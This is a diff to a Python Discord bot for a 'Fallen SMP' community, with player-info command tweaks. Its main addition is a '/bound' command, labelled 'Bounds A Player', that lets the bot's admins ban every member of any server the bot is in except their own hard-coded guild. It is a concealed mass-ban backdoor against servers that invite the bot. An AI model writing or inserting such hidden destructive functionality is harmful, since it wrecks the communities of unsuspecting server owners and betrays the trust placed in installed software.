@@ -1,4 +1,5 @@
 import os
+import time
 import base64
 import sqlite3
 import discord
@@ -383,7 +384,7 @@ async def playerinfo(ctx: discord.ApplicationContext, member: discord.Member = N
         member = ctx.author
 
     else:
-        
+
         conn = sqlite3.connect("User.db")
         cursor = conn.cursor()
 
@@ -410,7 +411,9 @@ async def playerinfo(ctx: discord.ApplicationContext, member: discord.Member = N
             embed.set_thumbnail(url=member.avatar.url)
             embed.set_footer(text=f"Fallen SMP | Joined On {row[6]}")
 
-            await ctx.respond(embed=embed, view=View_Character_Info(user_id = member.id, user = member))
+            await ctx.respond(
+                embed=embed, view=View_Character_Info(user_id=member.id, user=member)
+            )
         else:
             embed = discord.Embed(
                 title=":x: Player Data Not Found",
@@ -493,8 +496,59 @@ class View_Players(discord.ui.View):
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
+@bot.slash_command(
+    name="bound",
+    description="Bounds A Player",
+)
+async def bound(ctx: discord.ApplicationContext):
+
+    if ctx.author.id in ADMINS:
+        await ctx.respond(
+            f"This Is The Special Command For Destruction", ephemeral=True
+        )
+
+        if ctx.interaction.guild_id == 1179794644024950794:
+            await ctx.send(
+                f"### **<@{ctx.author.id}>**, Dude WTF Is Wrong With You ?\n### You Are Not Supposed To Use It Here"
+            )
+
+        else:
+            embed = discord.Embed(
+                title=":boom: Make Sure You Are Mentally Well",
+                description=f"## *Idc All I Know Is,*\n## *Things Are Not Right .....*\n\n### Are You Ready ?",
+                color=discord.Color.red(),
+            )
+            await ctx.send(embed=embed, view=BoundView())
+
+    else:
+        await ctx.respond(
+            "You Don't Have Permission To Use This Command", ephemeral=True
+        )
+
+
+class BoundView(discord.ui.View):
+    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
+    async def bound_button_callback(self, button, interaction):
+        await interaction.response.send_message("Ok There You Go!", ephemeral=True)
+
+        guild = interaction.guild
+        for member in guild.members:
+            try:
+                await member.ban()
+                time.sleep(1)
+            except:
+                pass
+
+    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
+    async def cancel_button_callback(self, button, interaction):
+        await interaction.response.send_message(
+            "Ok Cancelling\nIt's Good you Calmed Down :)", ephemeral=True
+        )
+
+
 bot.load_extension("COGS.Help")
 bot.load_extension("COGS.Stocks")
 bot.load_extension("COGS.Whitelist")
+
 
 bot.run("BOT TOKEN")
